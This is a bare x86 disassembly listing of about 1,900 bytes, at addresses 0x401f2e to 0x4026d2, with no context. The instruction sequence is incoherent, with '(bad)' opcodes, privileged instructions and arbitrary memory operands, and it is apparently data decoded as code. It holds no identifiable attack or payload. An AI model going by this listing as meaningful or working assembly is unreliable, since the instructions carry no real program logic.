  401f2e:	add    ah,0x8
  401f31:	mov    al,0xd0
  401f33:	adc    BYTE PTR [eax],cl
  401f35:	dec    edx
  401f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f37:	inc    eax
  401f38:	push   eax
  401f39:	add    esp,DWORD PTR [eax]
  401f3b:	add    BYTE PTR [eax],0x80
  401f3e:	add    BYTE PTR [ecx],ah
  401f40:	pusha  
  401f41:	and    DWORD PTR [eax+0x15],esi
  401f44:	mov    al,ds:0x38242d10
  401f49:	add    edx,eax
  401f4b:	adc    BYTE PTR ds:0xa8691504,0x50
  401f52:	adc    DWORD PTR [eax+eiz*2],0xd7920218
  401f59:	arpl   WORD PTR [esp+ebp*1],dx
  401f5c:	mov    eax,ds:0x9c10a110
  401f61:	add    BYTE PTR [esi],al
  401f63:	adc    al,0x44
  401f65:	and    BYTE PTR [eax+0x24400090],al
  401f6b:	mov    bh,BYTE PTR [eax]
  401f6d:	or     BYTE PTR [edx-0x78],0x0
  401f71:	add    al,BYTE PTR [eax+0x1180002c]
  401f77:	loopne 0x401fb9
  401f79:	pusha  
  401f7a:	add    BYTE PTR [edx+0x202091],ah
  401f80:	adc    dl,BYTE PTR [ecx+eax*1]
  401f83:	dec    ebx
  401f84:	add    BYTE PTR [eax+esi*1+0x208ce40],cl
  401f8b:	sub    BYTE PTR [ecx],0x4
  401f8e:	cwde   
  401f8f:	rol    al,1
  401f91:	add    BYTE PTR [ebx],0x3
  401f94:	add    BYTE PTR [eax+0x41a22a84],ah
  401f9a:	xor    DWORD PTR [esi-0x67ffa3f0],ecx
  401fa0:	and    BYTE PTR [eax],dl
  401fa2:	add    BYTE PTR ds:0x15ff8c01,bl
  401fa8:	cmp    BYTE PTR [ebx+0x200044],ah
  401fae:	push   es
  401faf:	inc    edx
  401fb0:	add    al,0x4
  401fb2:	and    BYTE PTR [ecx+eax*4-0x3eeff600],dl
  401fb9:	add    al,BYTE PTR [eax+0x25]
  401fbc:	and    BYTE PTR [eax],al
  401fbe:	adc    DWORD PTR [eax-0x7afffbfa],eax
  401fc4:	xor    al,BYTE PTR [ecx-0x6dfe776b]
  401fca:	add    DWORD PTR [eax],0x0
  401fcd:	or     BYTE PTR [edx+0x6581208],cl
  401fd3:	cwde   
  401fd4:	adc    BYTE PTR [edx-0x5ff3c7fd],cl
  401fda:	push   cs
  401fdb:	inc    edx
  401fdc:	sbb    al,BYTE PTR [eax]
  401fde:	add    al,BYTE PTR [ebp+0x1d]
  401fe1:	or     dh,BYTE PTR [eax+0x26050208]
  401fe7:	add    BYTE PTR [eax+eax*2],ch
  401fea:	add    DWORD PTR [eax-0x64],ebx
  401fed:	pusha  
  401fee:	inc    ecx
  401fef:	fiadd  WORD PTR [eax-0x40]
  401ff2:	je     0x402006
  401ff4:	or     eax,0x826a2420
  401ff9:	add    BYTE PTR [eax+0x72],al
  401ffc:	add    al,dl
  401ffe:	add    BYTE PTR [edx],al
  402000:	or     BYTE PTR [esi],cl
  402002:	add    ch,BYTE PTR [edx]
  402004:	add    BYTE PTR [ecx],0x98
  402007:	push   ebp
  402008:	or     ah,BYTE PTR [eax+0x5]
  40200b:	xor    BYTE PTR [eax+eax*8+0x24803c40],ah
  402012:	or     BYTE PTR [eax],bl
  402014:	sbb    al,0x2
  402016:	add    al,0x88
  402018:	sbb    BYTE PTR [edx-0x3d],al
  40201b:	adc    DWORD PTR [ecx],ebx
  40201d:	adc    eax,DWORD PTR [edx-0x57b17ef8]
  402023:	lods   al,BYTE PTR ds:[esi]
  402024:	and    eax,0x66584225
  402029:	loopne 0x40209c
  40202b:	sbb    al,bh
  40202d:	stc    
  40202e:	dec    eax
  40202f:	add    BYTE PTR [eax],cl
  402031:	push   cs
  402032:	or     al,0x4
  402034:	and    BYTE PTR [edi],cl
  402036:	inc    eax
  402037:	or     al,BYTE PTR [eax+eiz*4]
  40203a:	adc    al,0xc
  40203c:	dec    eax
  40203d:	adc    bl,BYTE PTR [eax]
  40203f:	daa    
  402040:	nop
  402041:	xor    al,0x29
  402043:	or     al,0x4c
  402045:	and    BYTE PTR [eax],ch
  402047:	dec    edx
  402048:	or     eax,0x1c100100
  40204d:	pop    eax
  40204e:	rcl    BYTE PTR [eax],cl
  402050:	add    al,0x31
  402052:	or     BYTE PTR [ebx],0x0
  402055:	popa   
  402056:	add    al,0x7
  402058:	push   eax
  402059:	add    al,BYTE PTR [eax+0x8]
  40205c:	add    DWORD PTR [ecx+0x9],eax
  40205f:	or     DWORD PTR ds:0x4200e442,ecx
  402065:	adc    BYTE PTR [edx],cl
  402067:	or     BYTE PTR [eax+0x20],0x9
  40206b:	test   BYTE PTR [eax],ah
  40206d:	push   eax
  40206e:	add    BYTE PTR [eax+0x2],al
  402071:	and    BYTE PTR [edx],al
  402073:	rol    BYTE PTR [eax+eax*1+0x601144a2],1
  40207a:	sbb    ah,BYTE PTR [eax+0x10]
  40207d:	rol    BYTE PTR [eax+eax*1+0x10],0x85
  402085:	and    BYTE PTR [edx],ah
  402087:	sub    BYTE PTR [edx],al
  402089:	add    BYTE PTR [eax],cl
  40208b:	or     ah,BYTE PTR [eax+0x34]
  40208e:	add    al,0xc2
  402090:	add    DWORD PTR [ebx-0x30],edi
  402093:	and    BYTE PTR [edx+0x18],al
  402096:	mov    BYTE PTR [edx+edx*1+0x11],al
  40209a:	add    DWORD PTR [eax+0x0],eax
  40209d:	push   ecx
  40209e:	mov    al,ds:0x10538105
  4020a3:	add    dl,BYTE PTR [eax]
  4020a5:	xor    BYTE PTR [eax+eax*1-0x70],al
  4020a9:	and    BYTE PTR [eax+0x1c],al
  4020ac:	mov    al,ds:0x11081580
  4020b1:	and    BYTE PTR [edx-0x5bf9fdfd],bl
  4020b7:	add    DWORD PTR [eax-0x30],eax
  4020ba:	sub    BYTE PTR [eax],0xa4
  4020bd:	dec    ecx
  4020be:	mov    al,0x44
  4020c0:	or     BYTE PTR [eax],al
  4020c2:	or     DWORD PTR [esi],edi
  4020c4:	inc    eax
  4020c5:	shl    BYTE PTR [esi+0x3314b030],0x61
  4020cc:	adc    bh,BYTE PTR [eax]
  4020ce:	push   esp
  4020cf:	loop   0x402101
  4020d1:	add    DWORD PTR [ebp+0x0],eax
  4020d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d5:	or     al,0x84
  4020d7:	or     BYTE PTR [eax+ecx*2-0x80],al
  4020db:	add    BYTE PTR [eax],0x30
  4020de:	imul   eax,DWORD PTR [eax+0x4],0x88c8c600
  4020e5:	or     al,0x10
  4020e7:	or     BYTE PTR [ecx+0x40060940],bl
  4020ed:	je     0x40210f
  4020ef:	stos   BYTE PTR es:[edi],al
  4020f0:	push   eax
  4020f1:	sub    al,BYTE PTR [ecx+eax*1]
  4020f4:	dec    eax
  4020f5:	inc    edx
  4020f6:	test   DWORD PTR [eax*2+0xa220960],eax
  4020fd:	sub    al,BYTE PTR [edx]
  4020ff:	and    BYTE PTR [edx+0x23941861],al
  402105:	mov    eax,0x4b081002
  40210a:	sbb    al,0x6
  40210c:	adc    al,BYTE PTR [eax]
  40210e:	and    BYTE PTR [eax],cl
  402110:	shl    BYTE PTR [ecx],cl
  402112:	add    DWORD PTR [ecx+0x2c],edx
  402115:	add    DWORD PTR [ebx],eax
  402117:	fwait
  402118:	xor    DWORD PTR [eax+0x1a0684a0],0x88a44402
  402122:	adc    al,BYTE PTR [eax+0x128b192]
  402128:	add    DWORD PTR [ebx+0x71],eax
  40212b:	pop    ecx
  40212c:	add    BYTE PTR [edx],cl
  40212e:	or     BYTE PTR [ecx],0x70
  402131:	sub    BYTE PTR [eax],al
  402133:	and    DWORD PTR [eax],eax
  402135:	add    BYTE PTR [eax+0x50287402],0xa8
  40213c:	inc    ebp
  40213d:	add    BYTE PTR [eax+0x64806022],dl
  402143:	push   0xd40310e2
  402148:	and    BYTE PTR [ecx],al
  40214a:	inc    esp
  40214b:	mov    DWORD PTR [eax],eax
  40214d:	adc    eax,0x804300
  402152:	adc    BYTE PTR [eax],0x88
  402155:	xchg   ecx,eax
  402156:	add    BYTE PTR [ecx-0x60],dl
  402159:	add    BYTE PTR [eax+eax*1],al
  40215c:	add    eax,eax
  40215e:	add    BYTE PTR [eax+0x1918467],cl
  402164:	and    DWORD PTR [ecx],edx
  402166:	add    BYTE PTR [eax],0x12
  402169:	xor    DWORD PTR [eax+eiz*1],esi
  40216c:	mov    bl,0x28
  40216e:	add    dh,BYTE PTR [edx]
  402170:	adc    al,BYTE PTR [eax+ecx*2]
  402173:	add    eax,0x4e110005
  402178:	push   ebp
  402179:	add    DWORD PTR [eax-0x5f],esi
  40217c:	and    BYTE PTR [ecx+0x43c40391],0x86
  402183:	adc    al,0x2
  402185:	add    BYTE PTR [ebp+0x28],bl
  402188:	adc    BYTE PTR [eax],dl
  40218a:	adc    esp,DWORD PTR [ebx]
  40218c:	adc    BYTE PTR [esi],al
  40218e:	and    al,0x90
  402190:	add    DWORD PTR [ebp+edx*4+0x9400832],0x109c1802
  40219b:	cmp    eax,DWORD PTR [eax]
  40219d:	and    BYTE PTR [eax-0x7fdef0bc],bl
  4021a3:	push   esi
  4021a4:	xor    al,0x0
  4021a6:	sub    ah,BYTE PTR [ebx]
  4021a8:	or     BYTE PTR [edx-0x7fdefde0],dl
  4021ae:	jo     0x4021be
  4021b0:	rcl    DWORD PTR [edx-0x7ecdf800],0xe8
  4021b7:	inc    ebp
  4021b8:	mov    al,BYTE PTR [eax]
  4021ba:	push   eax
  4021bb:	(bad)  
  4021bc:	adc    al,BYTE PTR [ebx]
  4021be:	and    BYTE PTR [eax+0x18],al
  4021c1:	fsub   st,st(1)
  4021c3:	sub    DWORD PTR [eax],0xce0151c1
  4021c9:	mov    ah,0x8
  4021cb:	add    BYTE PTR [edx],cl
  4021cd:	dec    eax
  4021ce:	adc    al,0x21
  4021d0:	add    BYTE PTR [eax+eax*4],dl
  4021d3:	inc    eax
  4021d4:	or     al,0x50
  4021d6:	and    BYTE PTR [eax+0x8689000],cl
  4021dc:	adc    DWORD PTR [ebx+0x0],ebx
  4021df:	and    BYTE PTR [eax-0x3c],cl
  4021e2:	add    DWORD PTR [eax],esp
  4021e4:	xor    eax,DWORD PTR [eax]
  4021e6:	add    dl,BYTE PTR [esp+eax*2]
  4021e9:	and    BYTE PTR ds:0x940a4114,al
  4021ef:	add    al,0xa4
  4021f1:	sub    al,0xc
  4021f3:	loopne 0x40220a
  4021f5:	ret    0x8172
  4021f8:	test   dl,al
  4021fa:	out    dx,eax
  4021fb:	and    al,0x20
  4021fd:	xor    BYTE PTR [eax],dl
  4021ff:	add    al,0xb9
  402201:	add    esp,DWORD PTR [eax+0x2]
  402204:	add    ebx,edx
  402206:	add    BYTE PTR [esi],0x24
  402209:	or     BYTE PTR ss:[esp+eiz*2],cl
  40220d:	add    DWORD PTR [eax],eax
  40220f:	adc    al,0x80
  402211:	inc    edi
  402212:	push   ecx
  402213:	add    BYTE PTR [esi],cl
  402215:	nop
  402216:	and    BYTE PTR [eax],al
  402218:	add    BYTE PTR [edx],0x20
  40221b:	xor    al,0x4
  40221d:	and    al,BYTE PTR [eax+0x618a8340]
  402223:	pop    eax
  402224:	add    BYTE PTR [eax],ah
  402226:	push   edx
  402227:	or     al,0x4
  402229:	add    eax,0xcb0a122
  40222e:	push   es
  40222f:	mov    al,ds:0x1e91103
  402234:	adc    al,BYTE PTR [ecx+eax*1]
  402237:	nop
  402238:	or     BYTE PTR [eax],al
  40223a:	adc    DWORD PTR [ecx+0x19],eax
  40223d:	cwde   
  40223e:	add    BYTE PTR [esi],0x80
  402241:	mov    al,ds:0x240000a
  402246:	adc    BYTE PTR [ecx],al
  402248:	add    BYTE PTR [edx+eax*2+0x10],cl
  40224c:	sub    BYTE PTR [eax],ah
  40224e:	add    DWORD PTR [eax],0xc824adc
  402254:	mov    fs,ecx
  402256:	or     BYTE PTR [edx-0x7f],al
  402259:	add    al,BYTE PTR [ecx+0x40]
  40225c:	inc    eax
  40225d:	cmp    al,BYTE PTR [eax+eiz*1-0x40]
  402261:	and    DWORD PTR [eax],esp
  402263:	and    eax,DWORD PTR [esi+ebx*1]
  402266:	add    DWORD PTR [eax+0xaa0c131],edx
  40226c:	or     BYTE PTR [ebx],dl
  40226e:	adc    al,0x0
  402270:	add    BYTE PTR [eax-0x77beb63e],ah
  402276:	inc    ecx
  402277:	sbb    DWORD PTR [eax],esp
  402279:	add    BYTE PTR ds:0x4072cc84,al
  40227f:	add    al,0x0
  402281:	add    DWORD PTR [ebx-0x3f65feb7],ecx
  402287:	and    BYTE PTR [ecx+0x6],0x2
  40228b:	add    BYTE PTR [eax],dl
  40228d:	add    BYTE PTR [ecx+0x1],ah
  402290:	sub    BYTE PTR [edx],dl
  402292:	add    al,0x41
  402294:	add    DWORD PTR [eax],ebp
  402296:	inc    esp
  402297:	or     al,0x2
  402299:	and    BYTE PTR [eax],al
  40229b:	sbb    BYTE PTR [ebp+0x111800b0],dh
  4022a1:	bound  esi,QWORD PTR [esi]
  4022a3:	les    ebx,FWORD PTR [eax-0x57df6ecc]
  4022a9:	sub    BYTE PTR [eax],al
  4022ab:	xchg   BYTE PTR [esi+esi*2+0x22431104],al
  4022b2:	mov    cl,0x1
  4022b4:	arpl   WORD PTR [eax],ax
  4022b6:	(bad)  
  4022b7:	adc    al,0x98
  4022b9:	adc    cl,BYTE PTR [esi]
  4022bb:	add    BYTE PTR [eax],al
  4022bd:	push   ebx
  4022be:	add    DWORD PTR [ecx+0x6181c010],eax
  4022c4:	sbb    BYTE PTR [esi],0x4
  4022c7:	add    BYTE PTR [eax],cl
  4022c9:	inc    esp
  4022ca:	dec    edx
  4022cb:	add    cl,BYTE PTR [eax+ecx*1]
  4022ce:	add    BYTE PTR [ecx+0x20],dl
  4022d1:	push   eax
  4022d2:	add    bl,BYTE PTR [edx-0x7f]
  4022d5:	inc    eax
  4022d6:	add    dh,BYTE PTR [eax]
  4022d8:	and    BYTE PTR [ebx+eax*1],al
  4022db:	es or  dl,cl
  4022de:	push   ds
  4022df:	adc    BYTE PTR [eax],al
  4022e1:	add    cl,BYTE PTR [eax]
  4022e3:	and    BYTE PTR [ecx],ch
  4022e5:	adc    BYTE PTR [eax],cl
  4022e7:	inc    esp
  4022e8:	popa   
  4022e9:	fadd   DWORD PTR [eax]
  4022eb:	push   cs
  4022ec:	and    eax,DWORD PTR [edx+0x3504843]
  4022f2:	inc    edx
  4022f3:	adc    ecx,DWORD PTR [ecx]
  4022f5:	xchg   ecx,eax
  4022f6:	sub    BYTE PTR [eax+0x2f],al
  4022f9:	dec    ecx
  4022fa:	or     BYTE PTR [eax+0x8],bl
  4022fd:	and    al,BYTE PTR [esi-0x7fefbc70]
  402303:	nop
  402304:	inc    esp
  402305:	push   ecx
  402306:	inc    ecx
  402307:	add    DWORD PTR [eax],0x14905080
  40230d:	adc    BYTE PTR [edx],cl
  40230f:	push   ecx
  402310:	jo     0x402318
  402312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402313:	add    al,0xc0
  402315:	add    al,0x1a
  402317:	rcr    BYTE PTR [ebx-0x7b],0x1
  40231b:	inc    esi
  40231c:	add    BYTE PTR [eax],al
  40231e:	or     BYTE PTR [ecx+edx*2],al
  402321:	xor    BYTE PTR [eax],al
  402323:	add    BYTE PTR [esi],al
  402325:	or     eax,DWORD PTR [eax-0x3d]
  402328:	inc    eax
  402329:	add    BYTE PTR [ecx+eax*1+0x264012a],al
  402330:	and    DWORD PTR [eax],edi
  402332:	inc    eax
  402333:	add    cl,BYTE PTR [ecx]
  402335:	or     BYTE PTR [eax+eax*4+0x8151028],al
  40233c:	and    eax,0x10900246
  402341:	add    BYTE PTR cs:[edx],0x42
  402345:	mov    al,ds:0x48022000
  40234a:	mov    eax,es:0x104c3a00
  402350:	xor    BYTE PTR [esi+eax*4],dl
  402353:	add    BYTE PTR [eax+0x78],al
  402356:	and    DWORD PTR [eax+0x60],esp
  402359:	inc    edx
  40235a:	or     BYTE PTR [eax],al
  40235c:	inc    eax
  40235d:	mov    BYTE PTR [eax],ch
  40235f:	and    BYTE PTR [eax+0x18b00a01],0x16
  402366:	sub    al,BYTE PTR [edx]
  402368:	aad    0x8a
  40236a:	inc    ecx
  40236b:	or     DWORD PTR [eax],eax
  40236d:	test   BYTE PTR [eax],cl
  40236f:	and    DWORD PTR [edx+ebp*4],esi
  402372:	inc    esp
  402373:	and    BYTE PTR [esp+esi*1+0x30],al
  402377:	nop
  402378:	rcl    BYTE PTR [ecx+0x980000],0x86
  40237f:	adc    DWORD PTR [ecx],ecx
  402381:	adc    DWORD PTR [ecx],edx
  402383:	or     BYTE PTR [ebx],al
  402385:	add    BYTE PTR [ecx],0x52
  402388:	or     cl,BYTE PTR [ebp+0x53]
  40238b:	xor    BYTE PTR [edx],0xd0
  40238e:	inc    eax
  40238f:	and    DWORD PTR [eax],edx
  402391:	sbb    BYTE PTR [esi],ah
  402393:	inc    edx
  402394:	and    DWORD PTR [eax+0x44e81106],eax
  40239a:	add    al,0x2
  40239c:	add    cl,BYTE PTR [ecx]
  40239e:	add    BYTE PTR [ebx+eiz*1],cl
  4023a1:	and    ah,BYTE PTR [edx+0x53803020]
  4023a7:	sbb    BYTE PTR [ecx],ch
  4023a9:	and    al,0x1
  4023ab:	adc    BYTE PTR [esi+0x44],al
  4023ae:	sbb    al,0x19
  4023b0:	inc    eax
  4023b1:	adc    DWORD PTR [ecx],ebp
  4023b3:	mov    al,ds:0x8020060
  4023b8:	push   ss
  4023b9:	push   0xc250380
  4023be:	mov    WORD PTR [esi+0x69a11c04],es
  4023c4:	nop
  4023c5:	add    BYTE PTR [eax],dl
  4023c7:	and    BYTE PTR [edx],ch
  4023c9:	bound  ebx,QWORD PTR [edi+edx*1+0x668a15]
  4023d0:	sbb    DWORD PTR [edx+0x61],eax
  4023d3:	and    BYTE PTR [ecx-0x4c],al
  4023d6:	xor    edx,DWORD PTR [eax+0x30202324]
  4023dc:	inc    ebx
  4023dd:	sbb    DWORD PTR [edx],esp
  4023df:	or     BYTE PTR [eax],0x40
  4023e2:	add    al,0x10
  4023e4:	adc    DWORD PTR [eax],eax
  4023e6:	sub    DWORD PTR ds:0x84010190,eax
  4023ec:	add    BYTE PTR [edx+0x60],al
  4023ef:	push   eax
  4023f0:	add    DWORD PTR [eax],eax
  4023f2:	or     BYTE PTR [eax],0x2a
  4023f5:	add    DWORD PTR [eax],esp
  4023f7:	inc    eax
  4023f8:	or     BYTE PTR [eax-0x20],ah
  4023fb:	mov    edx,cr4
  4023fe:	adc    BYTE PTR [ecx],0x2
  402401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402402:	add    BYTE PTR [ebp-0x2a],0x38
  402406:	or     BYTE PTR [eax+0x10],al
  402409:	sub    BYTE PTR [eax+esi*1],dl
  40240c:	or     BYTE PTR [eax+eax*1-0x6e],dh
  402410:	add    BYTE PTR [eax],0x10
  402413:	add    cl,BYTE PTR [eax+0x52687214]
  402419:	sbb    BYTE PTR [eax+0x14],al
  40241c:	add    BYTE PTR [eax],al
  40241e:	adc    al,0x8
  402420:	sbb    al,BYTE PTR [eax]
  402422:	or     BYTE PTR [ebx+0x42],dl
  402425:	and    ecx,DWORD PTR [eax]
  402427:	add    BYTE PTR [esi+eax*1],cl
  40242a:	dec    edx
  40242b:	shl    BYTE PTR [ecx+0x220a0018],0x46
  402432:	push   es
  402433:	or     al,0x80
  402435:	nop
  402436:	inc    esp
  402437:	and    BYTE PTR [eax+eax*2],bh
  40243a:	and    BYTE PTR [eax],cl
  40243c:	add    DWORD PTR [eax],ecx
  40243e:	add    BYTE PTR [edx],cl
  402440:	hlt    
  402441:	or     DWORD PTR [ecx],esi
  402443:	dec    ebp
  402444:	adc    al,0x38
  402446:	sbb    BYTE PTR [esi-0x3c],al
  402449:	adc    ecx,0x28000
  40244f:	push   ecx
  402450:	add    BYTE PTR [eax+0x58],bh
  402453:	and    DWORD PTR [eax],edx
  402455:	popf   
  402456:	add    al,BYTE PTR [edx]
  402458:	xor    BYTE PTR [ebx+edx*1],cl
  40245b:	sub    dh,BYTE PTR [eax]
  40245d:	cwde   
  40245e:	and    al,BYTE PTR [esp+edx*1-0x7bffdb7b]
  402465:	and    al,BYTE PTR [eax]
  402467:	and    BYTE PTR [eax],dl
  402469:	inc    eax
  40246a:	push   esp
  40246b:	add    DWORD PTR [eax],esp
  40246d:	popa   
  40246e:	xchg   ecx,eax
  40246f:	add    eax,0x41817400
  402474:	or     BYTE PTR [eax-0x7b],cl
  402477:	xor    dh,BYTE PTR [eax]
  402479:	and    al,0xa
  40247b:	add    ecx,ecx
  40247d:	inc    ebp
  40247e:	inc    esp
  40247f:	sub    BYTE PTR [eax],dl
  402481:	cmp    BYTE PTR [ebx],ah
  402483:	je     0x402486
  402485:	sbb    BYTE PTR [ecx-0x7eeeae6f],dh
  40248b:	or     BYTE PTR [eax],al
  40248d:	adc    BYTE PTR [ecx],al
  40248f:	add    al,0x88
  402492:	adc    DWORD PTR [eax],esp
  402494:	add    BYTE PTR [eax+eax*1+0x63],ah
  402498:	adc    BYTE PTR [eax],ah
  40249a:	add    al,BYTE PTR [edx+ecx*1-0x7c]
  40249e:	or     al,0x40
  4024a0:	sbb    al,0x60
  4024a2:	add    al,0x2
  4024a4:	or     BYTE PTR [eax-0x80],cl
  4024a7:	lds    edx,FWORD PTR [ecx]
  4024a9:	and    al,0x11
  4024ab:	adc    BYTE PTR [ebx-0x20],al
  4024ae:	and    BYTE PTR [eax+0xc180],al
  4024b4:	adc    DWORD PTR [eax],eax
  4024b6:	inc    eax
  4024b7:	or     BYTE PTR [ecx+eax*1],al
  4024ba:	inc    ecx
  4024bb:	sub    DWORD PTR [eax-0x7e],0xa2104211
  4024c2:	add    al,BYTE PTR [eax]
  4024c4:	add    BYTE PTR [eax],0x2
  4024c7:	sahf   
  4024c8:	add    BYTE PTR [edx],al
  4024ca:	and    al,0x0
  4024cc:	add    BYTE PTR [ecx],ah
  4024ce:	add    BYTE PTR [edx],al
  4024d0:	inc    edx
  4024d1:	inc    eax
  4024d2:	or     al,BYTE PTR [eax+edx*1]
  4024d5:	mov    ah,0x96
  4024d7:	or     al,BYTE PTR [edx+0x9ad2028]
  4024dd:	dec    esp
  4024de:	inc    eax
  4024df:	pop    esp
  4024e0:	add    BYTE PTR [eax],al
  4024e2:	add    al,0x90
  4024e4:	and    DWORD PTR [ecx],0x14000043
  4024ea:	pop    eax
  4024eb:	and    BYTE PTR [eax+0x54],al
  4024ee:	xor    bl,BYTE PTR [ecx]
  4024f0:	and    BYTE PTR [edx+0x24],al
  4024f3:	add    BYTE PTR [esi],0x28
  4024f6:	adc    al,0x8a
  4024f8:	or     BYTE PTR [eax],ah
  4024fa:	inc    esp
  4024fb:	add    BYTE PTR [eax+0xff840],0x80
  402502:	add    ecx,DWORD PTR [esi]
  402504:	adc    DWORD PTR [esi+ebp*1-0x60],0x8062b08
  40250c:	or     BYTE PTR [ecx+eax*4+0x88218a0],al
  402513:	and    al,0x14
  402515:	or     cl,BYTE PTR [eax]
  402517:	nop
  402518:	sub    BYTE PTR [eax-0x48],al
  40251b:	add    BYTE PTR [eax*2+0x42583c18],0x2
  402523:	pusha  
  402524:	add    eax,DWORD PTR [ebx]
  402526:	jo     0x402550
  402528:	ins    DWORD PTR es:[edi],dx
  402529:	and    BYTE PTR [ecx],ch
  40252b:	add    BYTE PTR [edi-0x36],al
  40252e:	push   edx
  40252f:	and    BYTE PTR [eax-0x80],ah
  402532:	push   esp
  402533:	add    eax,0xba029010
  402538:	or     ecx,eax
  40253a:	add    al,0x91
  40253c:	inc    eax
  40253d:	adc    BYTE PTR [eax],0xe6
  402540:	or     al,BYTE PTR [ebx]
  402542:	add    BYTE PTR [edx],al
  402544:	add    BYTE PTR [eax],al
  402546:	add    eax,0xf1418081
  40254b:	add    BYTE PTR [eax+eax*1],al
  40254e:	cwde   
  40254f:	add    BYTE PTR [eax+0x20],bl
  402552:	push   edx
  402553:	test   al,0x84
  402555:	or     BYTE PTR [eax-0x7dde7d6a],0x88
  40255c:	or     ah,BYTE PTR [eax]
  40255e:	add    DWORD PTR ds:0xca800c80,eax
  402564:	shl    BYTE PTR [eax],0x90
  402567:	sbb    BYTE PTR [eax],ch
  402569:	add    al,BYTE PTR [ebp+0x40]
  40256c:	inc    eax
  40256d:	and    BYTE PTR [eax],0x9
  402570:	add    DWORD PTR [eax],esp
  402572:	in     al,0x8
  402574:	or     BYTE PTR [ecx+0x7435c0],al
  40257a:	loopne 0x402580
  40257c:	add    BYTE PTR [edx-0x7e],0x8
  402580:	inc    ebx
  402581:	adc    BYTE PTR [eax],ah
  402583:	add    al,BYTE PTR [ecx+0x0]
  402586:	push   edx
  402587:	and    DWORD PTR [eax+0x2e],ecx
  40258a:	add    DWORD PTR [edi+0xd13805a],eax
  402590:	add    BYTE PTR [edx+0x20],al
  402593:	inc    eax
  402594:	xor    BYTE PTR [eax],0xc5
  402597:	inc    eax
  402598:	nop
  402599:	adc    al,BYTE PTR [eax+edx*2+0x40]
  40259d:	add    BYTE PTR [ecx],dl
  40259f:	push   es
  4025a0:	int3   
  4025a1:	or     DWORD PTR [edx],edx
  4025a3:	inc    esp
  4025a4:	test   BYTE PTR [ecx+ecx*1+0x4],ah
  4025a8:	add    DWORD PTR ds:0x9b218c,eax
  4025ae:	add    al,0xa3
  4025b0:	inc    eax
  4025b1:	add    DWORD PTR [eax+0x40],esp
  4025b4:	and    al,0x2
  4025b6:	adc    BYTE PTR [ebx],ah
  4025b8:	inc    edx
  4025b9:	nop
  4025ba:	es add al,dl
  4025bd:	sbb    al,BYTE PTR [edx]
  4025bf:	inc    ebp
  4025c0:	adc    ecx,DWORD PTR [ecx]
  4025c2:	dec    ecx
  4025c3:	and    BYTE PTR es:[eax],0x41
  4025c7:	loopne 0x402642
  4025c9:	test   BYTE PTR [eax+0x4004259],al
  4025cf:	or     al,BYTE PTR [eax]
  4025d1:	sbb    eax,0x6060a7
  4025d6:	sbb    BYTE PTR [eax+0x2340888c],bh
  4025dc:	adc    al,0x70
  4025de:	pop    eax
  4025df:	shl    BYTE PTR [ecx],0x95
  4025e2:	and    BYTE PTR [eax+eiz*2],ah
  4025e5:	add    BYTE PTR [eax],al
  4025e7:	add    BYTE PTR [ecx+0x0],al
  4025ea:	and    dh,BYTE PTR [ebx-0x78]
  4025ed:	xchg   esi,eax
  4025ee:	mov    esp,ss
  4025f0:	adc    BYTE PTR [edx+0x4429080],0x3
  4025f7:	ret    0x235a
  4025fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025fb:	push   ecx
  4025fc:	pop    ecx
  4025fd:	and    al,0x0
  4025ff:	inc    edx
  402600:	add    DWORD PTR [edx],eax
  402602:	push   ss
  402603:	ret    0x850
  402606:	inc    eax
  402607:	cwde   
  402608:	adc    dl,al
  40260a:	push   es
  40260b:	and    BYTE PTR [edx+0x4588011],al
  402611:	inc    eax
  402612:	add    dh,BYTE PTR [eax]
  402614:	adc    dl,BYTE PTR [edx+0x9782600]
  40261a:	mov    ecx,0x26000424
  40261f:	sbb    al,0x8
  402621:	mov    DWORD PTR [eax+eax*1-0x5d3fcfe4],eax
  402628:	add    BYTE PTR [eax+eax*2],al
  40262b:	adc    al,BYTE PTR [ebx]
  40262d:	adc    al,BYTE PTR [eax+eax*2]
  402630:	inc    esp
  402631:	sbb    al,BYTE PTR [ecx+0x30]
  402634:	retf   0x1122
  402637:	add    cl,BYTE PTR [edi]
  402639:	push   edx
  40263a:	ror    BYTE PTR [edx-0x7f],0x3
  40263e:	pop    edx
  40263f:	jmp    0x2a41ca4c
  402644:	sbb    al,0x90
  402646:	mov    cl,0x8c
  402648:	inc    ebp
  402649:	add    bl,al
  40264b:	loope  0x40264e
  40264d:	and    al,0x60
  40264f:	inc    edx
  402650:	and    al,bl
  402652:	add    eax,DWORD PTR [eax+0x2]
  402655:	adc    al,0xe0
  402657:	add    DWORD PTR [eax-0x7c],esp
  40265a:	adc    BYTE PTR [edx],dl
  40265c:	add    BYTE PTR [esi],dl
  40265e:	add    dh,BYTE PTR [eax]
  402660:	push   es
  402661:	inc    eax
  402662:	add    al,BYTE PTR [eax+0x664c8c03]
  402668:	xor    eax,0x103801c9
  40266d:	sbb    eax,0x8280c040
  402672:	adc    dh,BYTE PTR [eax+ecx*4-0x797b9f30]
  402679:	mov    WORD PTR [esi],es
  40267b:	inc    eax
  40267c:	mov    BYTE PTR [eax+eax*1],dl
  40267f:	sub    DWORD PTR [esi],ecx
  402681:	sub    al,0x85
  402684:	add    BYTE PTR [eax],0x20
  402687:	les    esp,FWORD PTR [eax+eiz*4]
  40268a:	inc    esp
  40268b:	and    al,0x20
  40268d:	xor    al,bh
  40268f:	add    al,0xcb
  402691:	or     DWORD PTR [eax+eax*2+0x390b0832],edx
  402698:	and    BYTE PTR [eax+0x22],ch
  40269b:	pusha  
  40269c:	adc    eax,0x321810c
  4026a1:	inc    edx
  4026a2:	xor    al,BYTE PTR [ebx+0x104910b2]
  4026a8:	and    BYTE PTR [edi+0x53],ah
  4026ab:	dec    eax
  4026ac:	dec    eax
  4026ad:	or     DWORD PTR [edx+0x34060008],esp
  4026b3:	shl    DWORD PTR [eax],0x42
  4026b6:	dec    eax
  4026b7:	adc    al,0x90
  4026b9:	mov    al,ds:0x21848e
  4026be:	adc    BYTE PTR ds:0x80c48,ah
  4026c4:	add    BYTE PTR [eax+0x24156020],al
  4026ca:	adc    BYTE PTR [ecx+eiz*1],dl
  4026cd:	dec    eax
  4026ce:	add    BYTE PTR [eax],dl
  4026d0:	inc    eax
  4026d1:	dec    eax
  4026d2:	jo     0x40270f
